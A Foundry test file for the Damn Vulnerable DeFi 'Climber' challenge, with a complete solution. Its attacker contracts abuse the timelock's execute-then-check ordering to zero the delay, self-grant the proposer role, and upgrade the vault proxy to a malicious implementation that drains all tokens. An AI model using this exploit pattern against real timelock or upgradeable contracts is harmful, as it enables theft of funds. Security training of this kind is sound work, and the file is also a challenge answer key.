// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        MalicousContract malicousContract = new MalicousContract(
            address(timelock),
            address(vault),
            player,
            recovery,
            address(token)
        );
        malicousContract.exploit();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}


contract MalicousContract {
    ClimberTimelock public timelock;
    ClimberVault public vault;
    DamnValuableToken public token;
    address public player;
    address public recovery;
    MaliciousVault maliciousVault;

    constructor(address _timelock, address _vault, address _player, address _recovery, address _token) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(_vault);
        player = _player;
        recovery = _recovery;
        token = DamnValuableToken(_token);
    }

    function exploit() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        maliciousVault = new MaliciousVault();

        // Step 1: Update delay to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(
            timelock.updateDelay,
            (uint64(0))
        );

        // Step 2: Grant PROPOSER_ROLE to the timelock itself
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(
            timelock.grantRole,
            (keccak256("PROPOSER_ROLE"), address(this))
        );


        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(
            this.schedule,
            ()
        );

        // Step 4: Upgrade vault to malicious implementation
        targets[3] = address(vault);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(
            vault.upgradeToAndCall,
            (
                address(maliciousVault),
                abi.encodeCall(MaliciousVault.steal, (address(token), recovery))
            )
        );

        // Execute the operation
        timelock.execute(targets, values, dataElements, bytes32(0));
    }

    function schedule() public {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        // Step 1: Update delay to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(
            timelock.updateDelay,
            (uint64(0))
        );

        // Step 2: Grant PROPOSER_ROLE to the timelock itself
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(
            timelock.grantRole,
            (keccak256("PROPOSER_ROLE"), address(this))
        );

        // Step 3: Schedule the SAME operation we're executing now
        // This is the key - we're scheduling the SAME operation we're currently executing
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(
            this.schedule,
            ()
        );

        // Step 4: Upgrade vault to malicious implementation
        targets[3] = address(vault);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(
            vault.upgradeToAndCall,
            (
                address(maliciousVault),
                abi.encodeCall(MaliciousVault.steal, (address(token), recovery))
            )
        );

        // Execute the operation
        timelock.schedule(targets, values, dataElements, bytes32(0));
    }
}

contract MaliciousVault is ClimberVault {
    function steal(address token, address recipient) external {
        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
    }
}

